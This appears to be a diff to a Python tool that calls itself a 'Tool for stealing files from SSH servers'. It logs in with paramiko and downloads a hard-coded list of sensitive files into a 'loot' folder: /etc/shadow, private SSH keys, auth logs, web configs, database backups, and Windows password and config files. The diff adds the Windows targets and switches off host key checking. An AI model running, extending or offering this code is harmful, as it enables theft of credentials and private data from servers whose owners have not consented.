@@ -5,6 +5,7 @@ from socket import timeout as stimeout
 from colorama import Fore, init
 
 directs = [
+    # Linux
     "/etc/passwd",
     "/etc/shadow", 
     "/etc/ssh/sshd_config",
@@ -12,18 +13,25 @@ directs = [
     "/home/user/.ssh/id_rsa",
     "/var/log/auth.log",
     "/var/www/html/config.php",
-    "/opt/backup.sql"
+    "/opt/backup.sql",
+
+    # Windows
+    "C:\\Users\\Administrator\\Desktop\\passwords.txt",
+    "C:\\ProgramData\\ssh\\sshd_config",
+    "C:\\Windows\\System32\\drivers\\etc\\hosts",
+    "C:\\Users\\%USERNAME%\\.ssh\\id_rsa",
+    "C:\\xampp\\htdocs\\config.php",
+    "C:\\inetpub\\wwwroot\\web.config"
 ]
 
 ssh = paramiko.SSHClient()
-ssh.set_missing_host_key_policy(paramiko.WarningPolicy())
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
 init()
 os.makedirs("loot", exist_ok=True)
 parser = argparse.ArgumentParser(description="Tool for stealing files from SSH servers")
 
 parser.add_argument("ip", help="Enter IP of SSH server")
-parser.add_argument("-p", "--port", type=int, default=22, help="Enter PORT of SSH server (default: 22, change if non-standard)")
 parser.add_argument("-user", "--username", required=True, help="Enter the username of  SSH Server")
 parser.add_argument("-passw", "--password", required=True, help="Enter the password of SSH Server")
 
@@ -42,7 +50,7 @@ try:
             sftp.get(path, f"./loot/{safe_path}")
             print(Fore.GREEN + f"Downloaded file: {path}" + Fore.RESET)
         except FileNotFoundError:
-            print(Fore.RED + "File not found" + Fore.RESET)
+            print(Fore.RED + f"{path} File not found" + Fore.RESET)
 except paramiko.AuthenticationException:
     print(Fore.RED + "Incorrect password or login" + Fore.RESET)
 except stimeout:
